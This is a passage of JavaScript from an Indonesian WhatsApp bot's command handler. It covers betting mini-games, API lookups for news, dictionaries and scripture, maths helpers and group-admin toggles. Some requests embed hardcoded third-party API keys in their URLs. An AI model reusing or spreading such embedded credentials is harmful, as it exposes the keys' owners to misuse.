 if (pemainMenang === 0) {
 // Pemain menang
 const menang = taruhan * 2;
 db.data.users[m.sender].balance += menang;
 m.reply(`Pemain menang! Kamu memenangkan ${menang} balance.`);
 } else {
 // Salah satu bot menang
 const botMenang = `Bot ${pemainMenang}`;
 const kalah = taruhan;
 db.data.users[m.sender].balance -= kalah;
 m.reply(`${botMenang} menang! Kamu kehilangan ${kalah} balance.`);
 }
}
 break
case 'adualien': {
    const namaAlien = ['xenon', 'zorgon', 'krakthor', 'vorkax', 'quintar', 'yurlex', 'plasmak', 'galactron', 'nebulor', 'zyggon'];
    const pilihan = args[0]?.toLowerCase();
    const taruhan = parseInt(args[1]);

    const userBalance = db.data.users[m.sender].balance; // Saldo pengguna
    let userWins = db.data.users[m.sender].wins || 0; // Jumlah kemenangan pengguna
    let userLosses = db.data.users[m.sender].losses || 0; // Jumlah kekalahan pengguna

    if (!pilihan) {
        return await m.reply(`Pilihan alien yang tersedia: ${namaAlien.join(', ')}`);
    }
    if (!namaAlien.includes(pilihan)) {
        return await m.reply('Pilihan alien tidak valid. Pilihan yang tersedia: ' + namaAlien.join(', '));
    }

    if (isNaN(taruhan) || taruhan <= 0 || taruhan > userBalance) {
        return await m.reply('Tentukan jumlah taruhan yang valid dan sesuai dengan saldo Anda.');
    }

    const lawanPilihan = namaAlien[Math.floor(Math.random() * namaAlien.length)];

    let userScore = 0;
    let lawanScore = 0;
    let maxRounds = 15; // Jumlah ronde maksimal
    let round = 1;
    let result = `⚔️ Mulai permainan adu alien dengan ${pilihan} melawan ${lawanPilihan} ⚔️\n\n`;

    while (round <= maxRounds) {
        let userAction = Math.random() < 0.5 ? 'serang' : 'bertahan';
        let lawanAction = Math.random() < 0.5 ? 'serang' : 'bertahan';

        if (userAction === 'serang' && lawanAction === 'bertahan') {
            userScore++;
            result += `🤜 ${pilihan} menyerang dan berhasil mengalahkan taktik bertahan ${lawanPilihan}! (+1 poin)\n`;
        } else if (userAction === 'bertahan' && lawanAction === 'serang') {
            lawanScore++;
            result += `🤜 ${lawanPilihan} menyerang dan mengalahkan taktik bertahan ${pilihan}! (+1 poin)\n`;
        } else {
            result += `🤝 Kedua alien sama-sama menerapkan taktik yang sama, ${pilihan} dan ${lawanPilihan}.\n`;
        }

        // Variasi aksi tambahan
        if (userScore - lawanScore >= 2) {
            result += `💥 ${pilihan} terluka dan masuk rumah sakit!\n`;
        } else if (lawanScore - userScore >= 2) {
            result += `💥 ${lawanPilihan} terluka dan masuk rumah sakit!\n`;
        }

        if (userScore >= 5) {
            result += `😢 ${pilihan} merasa tertekan oleh kekuatan ${lawanPilihan}.\n`;
        } else if (lawanScore >= 5) {
            result += `😢 ${lawanPilihan} merasa tertekan oleh kekuatan ${pilihan}.\n`;
        }

        if (userScore <= 1) {
            result += `🗣️ ${lawanPilihan} mengeluarkan teriakan menakutkan!\n`;
        } else if (lawanScore <= 1) {
            result += `🗣️ ${pilihan} mengeluarkan teriakan menakutkan!\n`;
        }

        round++;
    }
    result += `\n⏱️ Pertandingan selesai! Total skor: ${pilihan} ${userScore} - ${lawanPilihan} ${lawanScore}`;

    if (userScore > lawanScore) {
        const hasilMenang = taruhan * 2; // Menang 2x lipat taruhan
        result += `\n🎉 ${pilihan} menang +${hasilMenang} Balance melawan ${lawanPilihan}!`;
        db.data.users[m.sender].balance += hasilMenang - taruhan; // Menambah saldo jika menang
        userWins++;
    } else if (lawanScore > userScore) {
        result += `\n😢 ${pilihan} kalah -${taruhan} Balance melawan ${lawanPilihan}!`;
        db.data.users[m.sender].balance -= taruhan; // Mengurangi saldo jika kalah
        userLosses++;
    } else {
        result += `\n⚖️ Pertandingan adu alien melawan ${lawanPilihan} berakhir imbang!`;
    }

    // Memperbarui jumlah kemenangan dan kekalahan pengguna
    db.data.users[m.sender].wins = userWins;
    db.data.users[m.sender].losses = userLosses;

    await m.reply(`${result}`);
}
break;
                
case 'casino':
    {
        let bet = parseInt(args[0]); // Jumlah taruhan dari pengguna
        let number = parseInt(args[1]); // Nomor yang dipilih oleh pengguna

        if (isNaN(bet) || isNaN(number)) {
            throw new Error('Format yang benar: casino <taruhan> <nomor>');
        }

        let userBalance = 1000; // Saldo pengguna (gantilah dengan nilai saldo sesuai kebutuhan)

        if (bet > userBalance) {
            throw new Error('Saldo tidak cukup.');
        }

        let rolledNumber = Math.floor(Math.random() * 6) + 1; // Menghasilkan angka acak dari 1 hingga 6

        let resultText = `Angka dadu yang keluar: ${rolledNumber}\n`;

        if (rolledNumber === number) {
            let winnings = bet * 6; // Jika tebakan benar, pengguna memenangkan 6 kali taruhan
            userBalance += winnings;
            resultText += `Selamat! Anda menang ${winnings}.\n`;
        } else {
            userBalance -= bet;
            resultText += `Sayang sekali, Anda kalah ${bet}.\n`;
        }

        resultText += `Saldo Anda sekarang: ${userBalance}.`;

        m.reply(resultText);
    }
    break;
    case 'ipinfo':
  if (!isPrem) return replyprem(mess.premium)    
    if (!text) throw 'Gunakan: *ipinfo [alamat IP]*';
    const ip = args[0];
    try {
        const ipInfo = await getIpInfo(ip);
        const replyMessage = `Informasi tentang alamat IP ${ip}:\n\nNegara: ${ipInfo.country}\nDaerah: ${ipInfo.region}\nKota: ${ipInfo.city}\nOrganisasi: ${ipInfo.org}\nLokasi: ${ipInfo.loc}`;
        m.reply(replyMessage);
    } catch (error) {
        m.reply(error);
    }
break;


case 'bbcnews':
  try {
    const newsList = await getLatestBBCNews();

    if (newsList.length === 0) {
      m.reply('Tidak ada berita terbaru dari BBC yang tersedia saat ini.');
    } else {
      let replyMessage = 'Berita Terbaru dari BBC:\n';

      for (const newsItem of newsList) {
        const { title, link } = newsItem;
        replyMessage += `Judul: ${title}\n`;
        replyMessage += `Link: ${link}\n\n`;
      }

      m.reply(replyMessage);
    }
  } catch (error) {
    m.reply('Terjadi kesalahan saat mengambil berita terbaru dari BBC.');
    console.error('Error fetching latest BBC news:', error);
  }
  break;  
case 'animelast':{
  try {
    const animeList = await getLatestAnime();

    if (animeList.length === 0) {
      m.reply('Tidak ada daftar anime terbaru yang tersedia saat ini.');
    } else {
      let replyMessage = 'Anime Terbaru:\n';

      for (const anime of animeList) {
        const { title, link } = anime;
        replyMessage += `Judul: ${title}\n`;
        replyMessage += `Link: ${link}\n\n`;
      }

      m.reply(replyMessage);
    }
  } catch (error) {
    m.reply('Terjadi kesalahan saat mengambil daftar anime terbaru.');
    console.error('Error fetching latest anime:', error);
  }
  }
  break;
case 'akar': {
 const num = Number(text);
 if (!text || isNaN(num)) throw 'Contoh penggunaan: !akar 9';
 const result = Math.sqrt(num);
 m.reply(`Akar kuadrat dari ${num} adalah ${result}`);
}
break
			case 'toxicheck':{
			  let cok = text;
  if (m.quoted) {
    const quotedMessage = await m.getQuotedMessage();
    if (quotedMessage.text) {
      cok = quotedMessage.text;
    }
  }
  if (!cok) {
    m.reply('Balas pesan seseorang dengan pertanyaan atau ketik pertanyaan langsung.');
    return;
  }
			var { data } = await axios.get(`https://skizo.tech/api/toxic-checker?text=${cok}&apikey=${apikey}`)
			m.reply(`Nilai : ${data.toxicity}\nInsult : ${data.insult}\nCombined : ${data.combined}`.trim())
			}
			break
			case 'ringkasan':{
						  let cok = text;
  if (m.quoted) {
    const quotedMessage = await m.getQuotedMessage();
    if (quotedMessage.text) {
      cok = quotedMessage.text;
    }
  }
  if (!cok) {
    m.reply('Balas pesan seseorang dengan pertanyaan atau ketik pertanyaan langsung.');
    return;
  }			
			var { data } = await axios.get(`https://skizo.tech/api/paraphraser?text=${cok}&apikey=${apikey}`)
			m.reply(`Hasil : ${data.content}\nTotal Keys : ${data.countWord}`.trim())
			}		
			break
case 'quote':
  if (!isPrem) return replyprem(mess.premium)  
    if (!text)  throw 'Gunakan: *quote [kata_kunci]*';
                    if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
                db.data.users[m.sender].limit -= 20 // -1 limit
    const input = args.join('_');
    try {
        const quoteResult = await quotes(input);
        if (quoteResult.status) {
            const randomIndex = Math.floor(Math.random() * quoteResult.data.length);
            const randomQuote = quoteResult.data[randomIndex];
            const replyMessage = `${q}\n\n"${randomQuote.quote}"\n\n- ${randomQuote.author} (${randomQuote.bio})\n\n•Made In Avosky`;
            m.reply(replyMessage);
        } else {
            m.reply('Kutipan bijak tidak ditemukan.');
        }
    } catch (error) {
        m.reply('Terjadi kesalahan saat mencari kutipan bijak.');
    }
break;
			case 'biksu': {
		if (!text) throw `Example : ${prefix + command} Siapa Nama Mu`			
			var { data } = await axios.get(`https://api.betabotz.eu.org/api/search/openai-logic?text=${text}&logic=halo%20saya%20adalah%20biksu%20saya%20di%20ciptakan%20untuk%20memberi%20tau%20kamu%20tentang%20agama%20buddha%20jika%20kamu%20ingin%20bertanya%20silahkan%20saja%20dan%20nama%20saya%20adalah%20ai%20biksu&apikey=2fbgCgOB`)
			m.reply(`${data.message}`.trim())
			}
			break			
case 'suitbot':{
  const weapons = ['rock', 'paper', 'scissors'];

  function getRandomWeapon() {
      return weapons[Math.floor(Math.random() * weapons.length)];
  }

  const userWeapon = args[0]?.toLowerCase();
  if (!userWeapon || !weapons.includes(userWeapon)) {
    return sky.sendText(from, `Pilih senjata yang valid: ${weapons.join(', ')}`);
  }

  const computerWeapon = getRandomWeapon();
  
  let result;
  if (userWeapon === computerWeapon) {
    result = "It's a tie!";
  } else if (
    (userWeapon === 'rock' && computerWeapon === 'scissors') ||
    (userWeapon === 'paper' && computerWeapon === 'rock') ||
    (userWeapon === 'scissors' && computerWeapon === 'paper')
  ) {
    result = 'You win!';
  } else {
    result = 'Computer wins!';
  }

  sky.sendText(from, `You chose ${userWeapon}\nComputer chose ${computerWeapon}\n${result}`);
  }
  break;

case 'daftar': {
  const username = args[0]; // Ambil nama pengguna dari pesan

  if (!username) {
    m.reply('Masukkan nama pengguna saat mendaftar.');
    return;
  }

  const userNumber = m.sender; // Nomor pengguna, Anda dapat menggantinya sesuai dengan struktur bot Anda

  // Cek apakah pengguna sudah terdaftar
  if (registeredUsers[userNumber]) {
    m.reply('Anda sudah terdaftar.');
  } else {
    sendOTP(userNumber);
    m.reply(`Selamat datang, ${username}! Kami telah mengirimkan OTP ke Anda.`);
  }
  }
  break;
// Case untuk memverifikasi pengguna dengan OTP
case 'verifikasi': {
  const userNumber = m.sender; // Nomor pengguna
  const userOTP = args[0]; // Ambil OTP dari pesan

  if (!userOTP) {
    m.reply('Masukkan OTP untuk verifikasi.');
    return;
  }

  // Cek apakah pengguna sudah terdaftar
  if (registeredUsers[userNumber]) {
    const storedOTP = registeredUsers[userNumber].otp;

    if (parseInt(userOTP) === storedOTP) {
      m.reply('Verifikasi sukses! Anda sekarang terdaftar.');
      delete registeredUsers[userNumber]; // Hapus data pengguna setelah verifikasi sukses
    } else {
      m.reply('Verifikasi gagal. Harap masukkan OTP yang benar.');
    }
  } else {
    m.reply('Anda belum mendaftar. Silakan daftar terlebih dahulu.');
  }
  }
  break;
 case 'alkitab':  {
    if (!text) throw `uhm.. teksnya mana?\n\ncontoh:\nAlkitab kejadian`
    m.reply('Patience, O Earthlings')
    let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } })
    const cheerio = require('cheerio');
    let $ = cheerio.load(res.data)
    let result = []
    $('div.vw').each(function (a, b) {
        let teks = $(b).find('p').text().trim()
        let link = $(b).find('a').attr('href')
        let title = $(b).find('a').text().trim()
        result.push({ teks, link, title })
    })

    let caption = result.map(v => `${v.title}\n${v.teks}`).join('\n────────\n')
    m.reply(caption)
}
break
case 'sinonim': {
    if (!text) throw 'Tolong masukkan kata untuk mencari sinonimnya.'

    try {
        m.reply('Sedang mencari sinonim kata...')
        let res = await axios.get(`https://api.datamuse.com/words?rel_syn=${encodeURIComponent(text)}`, {
            timeout: 50000 // Timeout dalam milidetik (misalnya, 5 detik)
        });
        let data = res.data
        if (data.length > 0) {
            let synonyms = data.map(item => item.word).join(', ')
            m.reply(`Sinonim dari "${text}" adalah: ${synonyms}`)
        } else {
            throw 'Tidak ada sinonim yang ditemukan.'
        }
    } catch (err) {
        console.error(err);
        if (err.code === 'ECONNABORTED') {
            m.reply('Permintaan ke server terlalu lambat. Coba lagi nanti.');
        } else {
            m.reply('Terjadi kesalahan saat mencari sinonim kata.');
        }
    }

    break;
}

case 'kamus': {
    if (!text) throw 'Tolong masukkan kata yang ingin Anda cari.'

    try {
        m.reply('Sedang mencari arti kata...')
        let res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`, {
            timeout: 15000 // Timeout dalam milidetik (misalnya, 5 detik)
        });
        let data = res.data[0]
        if (data) {
            let meanings = data.meanings.map(meaning => {
                let definitions = meaning.definitions.map(def => def.definition).join('\n')
                return `${meaning.partOfSpeech}: ${definitions}`
            }).join('\n\n')

            let response = `**${data.word}**\n\n${meanings}`
            m.reply(response)
        } else {
            throw 'Kata tidak ditemukan dalam kamus.'
        }
    } catch (err) {
        console.error(err);
        if (err.code === 'ECONNABORTED') {
            m.reply('Permintaan ke server terlalu lambat. Coba lagi nanti.');
        } else {
            m.reply('Terjadi kesalahan saat mencari arti kata.');
        }
    }

    break;
}
case 'akar':{
		if (!text) throw `Example : ${prefix + command} 30`
			m.reply(mess.wait)
			var { data } = await axios.get(`https://api.akuari.my.id/edukasi/akar?angka=${text}`)
			m.reply(`${data.hasil}`.trim())
			}
			break
case 'pangkat': {
 const [base, exponent] = text.split(' ').map(Number);
 if (!text || isNaN(base) || isNaN(exponent)) throw 'Contoh penggunaan: !pangkat 2 3';
 const result = Math.pow(base, exponent);
 m.reply(`Hasil dari ${base} pangkat ${exponent} adalah ${result}`);
}
break

case 'kali': {
 const [num1, num2] = args;
 if (isNaN(num1) || isNaN(num2)) {
 m.reply('Tentukan dua angka yang valid untuk perkalian.');
 } else {
 const result = num1 * num2;
 m.reply(`Hasil dari ${num1} x ${num2} adalah ${result}`);
 }
}
break
case 'ainime2': {
if (!isPrem) return replyprem(mess.premium)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ainime2 doodle\n\nList Filter\n• gta5\n• dball\n• naruto\n• cyber\n• killer\n• kyoto\n• bikini\n• iron`)
                    if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ainime2 doodle\n\nList Filter\n• gta5\n• dball\n• naruto\n• cyber\n• killer\n• kyoto\n• bikini\n• iron`)
                    if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ainime2 doodle\n\nList Filter\n• gta5\n• dball\n• naruto\n• cyber\n• killer\n• kyoto\n• bikini\n• iron`)
m.reply(mess.wait)
	const media = await sky.downloadAndSaveMediaMessage(quoted)
	const { TelegraPh } = require('./lib/uploader')
	const anu = await TelegraPh(media)
	let { data } = await axios.get(`https://skizo.tech/api/aimirrorvip?&apikey=${apikey}&url=${anu}&filter=${text}`)
	if (data.message) return m.reply(JSON.stringify(data))
	await sky.sendMessage(m.chat, { image: { url: data.generated_image_addresses[0] }, caption: mess.done }, { quoted: m })
}
break                                 			
case 'periksa':
  if (!pasienSakit[m.chat]) {
    m.reply('Tidak ada permainan dokter yang sedang berlangsung. Ketik *dokter* untuk memulai.');
  } else {
  let member = participants.map(u => u.id)
  let me = m.sender
  let jodoh = member[Math.floor(Math.random() * member.length)]
    const pasien = m.sender;
    const penyakit = ['Demam', 'Flu', 'Sakit Perut', 'Pusing'];
    const penyakitIndex = Math.floor(Math.random() * penyakit.length);
    const hasilPeriksa = `${m.sender} memeriksa @${jodoh.split('@')[0]} dan menemukan bahwa dia memiliki penyakit: ${penyakit[penyakitIndex]}`;
    pasienSakit[m.chat].push(pasien);
    const obatIndex = Math.floor(Math.random() * obatTersedia.length);
    const obat = obatTersedia[obatIndex];
    obatDokter[pasien] = obat; 
    m.reply(`${hasilPeriksa}\nDokter memberikan ${obat} sebagai pengobatan\n\nketik obati.`);
  }
  break;
  case 'konversisuhu': {
    const suhuCelsius = parseFloat(args[0]);

    if (isNaN(suhuCelsius)) {
        m.reply('Masukkan suhu dalam Celsius yang valid.');
        return;
    }

    // Konversi ke Fahrenheit
    const suhuFahrenheit = (suhuCelsius * 9/5) + 32;

    // Konversi ke Kelvin
    const suhuKelvin = suhuCelsius + 273.15;

    // Konversi ke Reamur
    const suhuReamur = suhuCelsius * 4/5;

    m.reply(`Hasil konversi suhu:
    ${suhuCelsius} Celsius sama dengan:
    ${suhuFahrenheit} Fahrenheit
    ${suhuKelvin} Kelvin
    ${suhuReamur} Reamur`);
    break;
} 
case 'obati':
  if (!pasienSakit[m.chat]) {
    m.reply('Tidak ada permainan dokter yang sedang berlangsung. Ketik *dokter* untuk memulai.');
  } else {
    const pasien = m.sender;
    
    if (obatDokter[pasien]) {
      m.reply(`Anda memberikan ${obatDokter[pasien]} kepada pasien.`);
      delete obatDokter[pasien];
      const index = pasienSakit[m.chat].indexOf(pasien);
      if (index !== -1) {
        pasienSakit[m.chat].splice(index, 1);
      }
      if (pasienSakit[m.chat].length === 0) {
        const pemenang = pasien;
        delete pasienSakit[m.chat];
        m.reply(`Selamat, ${pemenang} telah berhasil mengobati semua pasien! Permainan dokter selesai.`);
      }
    } else {
      m.reply('Anda tidak memiliki obat untuk diberikan kepada pasien.');
    }
  }
  break;
case 'daftarpasien':
  if (!pasienSakit[m.chat]) {
    m.reply('Tidak ada permainan dokter yang sedang berlangsung. Ketik *dokter* untuk memulai.');
  } else {
    const daftarPasien = pasienSakit[m.chat].join(', ');
    m.reply(`Daftar pasien yang sakit: ${daftarPasien}`);
  }
  break;
case 'selesai':
  if (!pasienSakit[m.chat]) {
    m.reply('Tidak ada permainan dokter yang sedang berlangsung.');
  } else {
    const pemenang = pasienSakit[m.chat].join(', ');
    delete pasienSakit[m.chat];
    m.reply(`Permainan dokter selesai! Pemenangnya adalah: ${pemenang}`);
  }
  break;
case 'katabijak': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
let zeltoria = await fetch(`https://api.lolhuman.xyz/api/random/katabijak?apikey=Gata_Dios`)
let hasil = await zeltoria.json()
 m.reply(`${hasil.result}`.trim())
 }
 break
case 'motivasi': {
 const quotes = [
 "Kebangkitan datang dari kejatuhan. Setiap kegagalan adalah langkah menuju keberhasilan.",
 "Hiduplah seolah-olah kamu akan mati besok. Belajarlah seolah-olah kamu akan hidup selamanya.",
 "Kesuksesan bukan kunci kebahagiaan. Kebahagiaan adalah kunci kesuksesan. Jika kamu mencintai apa yang kamu lakukan, kamu akan sukses.",
 "Jangan menunggu; waktu tidak akan pernah 'tepat'. Mulailah dari tempat kamu berdiri, dan bekerja dengan alat yang ada padamu.",
 "Halangan adalah sesuatu yang kamu lihat ketika kamu kehilangan fokus pada tujuan.",
 "Jangan biarkan kemarin mengambil terlalu banyak dari hari ini.",
 "Sukses adalah hasil dari usaha yang terus-menerus. Jangan pernah menyerah!",
 "Bukan tentang seberapa keras kamu jatuh, tetapi seberapa keras kamu bangkit kembali.",
 "Jika kamu bisa memimpikannya, kamu bisa melakukannya.",
 "Kunci untuk mengubah adalah meletakkan semua energi kamu, bukan pada perjuangan, tetapi pada penciptaan.",
 ];

 const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
 m.reply(randomQuote);
}
break

case 'dilanquote': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
let skey = await fetch(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=Gata_Dios`)
let hasil = await skey.json()
 m.reply(`${hasil.result}`.trim())
 }
 break
case 'puisi': {
 const poems = [
 "Di bawah langit yang biru,\nKita melangkah berdua,\nMembawa harapan yang tak pudar,\nMenuju masa depan yang cerah.\n\n",
 
 "Sinar pagi menyapa lembut,\nBunga-bunga merekah indah,\nKehidupan penuh warna dan rasa,\nMengisi hati yang penuh cinta.\n\n",
 
 "Di tengah hutan yang rimbun,\nAngin berbisik lembut dan manis,\nSetiap dedaunan menari ceria,\nMenggambarkan kehidupan yang harmonis.\n\n",
 
 "Bintang-bintang di malam yang gelap,\nMenyinari jalan yang kita pilih,\nSetiap mimpi takkan sirna,\nAsalkan kita takkan berhenti berjuang.\n\n",
 
 "Seperti laut yang tak pernah berhenti bergelora,\nBegitu pula hati ini, takkan pernah lelah,\nMencari cinta, menunggu cinta,\nDalam setiap detik yang berlalu.\n\n",
 
 "Hujan di sore yang sepi,\nMenyapu debu dari jalanan,\nSeperti cinta yang tak kunjung datang,\nTetap berharap, tetap menanti.\n\n",
 
 "Ketika fajar mulai menyingsing,\nSemua mimpi mulai terbangun,\nDi setiap detik yang berharga,\nKita ukir cerita yang takkan sirna.\n\n",
 
 "Cinta bagaikan api yang membara,\nHangatkan jiwa di kala sepi,\nDalam dekapan malam yang penuh rasa,\nKita berjanji untuk selalu bersama.\n\n",
 
 "Matahari tenggelam di ujung barat,\nMewarnai langit dengan jingga dan ungu,\nSeperti perjalanan yang penuh liku,\nKita jalani dengan hati yang utuh.\n\n",
 
 "Di puncak gunung yang tinggi,\nKita lihat dunia dari atas,\nSemua impian tampak lebih dekat,\nDengan usaha dan doa yang tak pudar.\n\n"
 ];

 const randomPoem = poems[Math.floor(Math.random() * poems.length)];
 m.reply(randomPoem);
}
break;

        case 'totag': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
               if (!m.isGroup) throw mess.group
               if (!isBotAdmins) throw mess.botAdmin
               if (!isAdmins) throw mess.admin
               if (!m.quoted) throw `Reply pesan dengan caption ${prefix + command}`
               sky.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
                               case 'infonegara':{
    const countryName = args.join(' ');

    if (!countryName) {
        m.reply('Masukkan nama negara terlebih dahulu.');
        return;
    }

    const apiUrl = `https://restcountries.com/v3.1/name/${countryName}`;
    fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            const countryInfo = data[0];

            if (countryInfo) {
const infoNegara = `
Informasi Negara ${countryInfo.name.common}
Wilayah: ${countryInfo.region}
Sub Wilayah: ${countryInfo.subregion}
Ibukota: ${countryInfo.capital}
Bahasa Resmi: ${countryInfo.languages[Object.keys(countryInfo.languages)[0]]}
Mata Uang: ${countryInfo.currencies[Object.keys(countryInfo.currencies)[0]].name} (${countryInfo.currencies[Object.keys(countryInfo.currencies)[0]].symbol})
Populasi: ${countryInfo.population}
Luas Wilayah: ${countryInfo.area} km²
Domain Internet: ${countryInfo.tld}
Batas Negara: ${countryInfo.borders.join(', ')}
Zona Waktu: ${countryInfo.timezones.join(', ')}
                `;

                replygc(infoNegara);
            } else {
                m.reply('Negara tidak ditemukan.');
            }
        })
        .catch(error => {
            console.error('Terjadi kesalahan:', error);
            m.reply('Terjadi kesalahan saat mengambil informasi negara.');
        });
    break;
}
case 'hargabbm':
    if (!text) throw 'Gunakan: *travelcost [jarak dalam kilometer] [harga bahan bakar per liter]\nContoh hargabbm 18 12000*';   
    const distance = parseFloat(args[0]);
    const fuelPrice = parseFloat(args[1]);

    if (isNaN(distance) || isNaN(fuelPrice) || distance <= 0 || fuelPrice <= 0) {
        throw 'Masukkan angka yang valid untuk jarak dan harga bahan bakar.';
    }

    // Estimating fuel consumption at 10 kilometers per liter
    const fuelConsumption = distance / 10;

    // Calculating total cost
    const totalCost = fuelConsumption * fuelPrice;

    const replyMessage = `Estimasi biaya perjalanan:\nJarak: ${distance} kilometer\nHarga bahan bakar: Rp${fuelPrice} per liter\nBiaya bahan bakar: Rp${totalCost.toFixed(0)}0`;
    m.reply(replyMessage);
break;

               case 'group': case 'grup': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0].toLowerCase() === 'close'){
                    await sky.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0].toLowerCase() === 'open'){
                    await sky.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                    sky.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} Open`,`${command.charAt(0).toUpperCase()+command.slice(1)} Close`])
             }
            }
            break
            case 'editinfo': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0].toLowerCase() === 'open'){
                await sky.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0].toLowerCase() === 'close'){
                await sky.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
                sky.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} Open`,`${command.charAt(0).toUpperCase()+command.slice(1)} Close`])
            }
            }
            break
case 'antilinkgc': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;

    if (args[0] === "on") {
        if (ntlinkgc.includes(from)) return m.reply('Already activated');
        ntlinkgc.push(from);
        fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc));
        m.reply('Success in turning on AntilinkGc in this group');
    } else if (args[0] === "off") {
        if (!ntlinkgc.includes(from)) return m.reply('Already deactivated');
        let off = ntlinkgc.indexOf(from);
        ntlinkgc.splice(off, 1);
        fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc));
        m.reply('Success in turning off AntilinkGc in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
            case 'antivirtex': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;

    if (args[0] === "on") {
        if (ntvirtex.includes(from)) return m.reply('Already activated');
        ntvirtex.push(from);
        fs.writeFileSync('./database/antivirtex.json', JSON.stringify(ntvirtex));
        m.reply('Success in turning on antiVirtex in this group');
    } else if (args[0] === "off") {
        if (!ntvirtex.includes(from)) return m.reply('Already deactivated');
        let off = ntvirtex.indexOf(from);
        ntvirtex.splice(off, 1);
        fs.writeFileSync('./database/antivirtex.json', JSON.stringify(ntvirtex));
        m.reply('Success in turning off antiVirtex in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'antiwame': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;

    if (args[0] === "on") {
        if (ntwame.includes(from)) return m.reply('Already activated');
        ntwame.push(from);
        fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame));
        m.reply('Success in turning on antiWame in this group');
    } else if (args[0] === "off") {
        if (!ntwame.includes(from)) return m.reply('Already deactivated');
        let off = ntwame.indexOf(from);
        ntwame.splice(off, 1);
        fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame));
        m.reply('Success in turning off antiWame in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'ayat': {
 const command = m.body.split(' '); // Memisahkan perintah menjadi komponen-komponennya
 const surahNumber = parseInt(command[1], 10); // Nomor surah yang diberikan oleh pengguna
 const ayatNumber = parseInt(command[2], 10); // Nomor ayat yang diberikan oleh pengguna

 if (isNaN(surahNumber) || isNaN(ayatNumber)) {
 m.reply('Silakan masukkan nomor surah dan ayat yang valid.');
 return;
 }

 async function alquran(surah, ayat) {
 let res = await fetch(`https://kalam.sindonews.com/ayat/${ayat}/${surah}`);
 if (!res.ok) throw 'Error, maybe not found?';
 let $ = cheerio.load(await res.text());
 let content = $('body > main > div > div.content.clearfix > div.news > section > div.list-content.clearfix');
 let Surah = $(content).find('div.ayat-title > h1').text();
 let arab = $(content).find('div.ayat-detail > div.ayat-arab').text();
 let latin = $(content).find('div.ayat-detail > div.ayat-latin').text();
 let terjemahan = $(content).find('div.ayat-detail > div.ayat-detail-text').text();
 let tafsir = '';
 $(content).find('div.ayat-detail > div.tafsir-box > div').each(function () {
 tafsir += $(this).text() + '\n';
 });
 tafsir = tafsir.trim();
 let keterangan = $(content).find('div.ayat-detail > div.ayat-summary').text();
 let audio = `https://quran.kemenag.go.id/cmsq/source/s01/${surah < 10 ? '00' : surah >= 10 && surah < 100 ? '0' : ''}${surah}${ayat < 10 ? '00' : ayat >= 10 && ayat < 100 ? '0' : ''}${ayat}.mp3`;
 return {
 surah: Surah,
 arab,
 latin,
 terjemahan,
 tafsir,
 audio,
 keterangan,
 };
 }

 async function fetchAyat() {
 try {
 const ayatData = await alquran(surahNumber, ayatNumber);
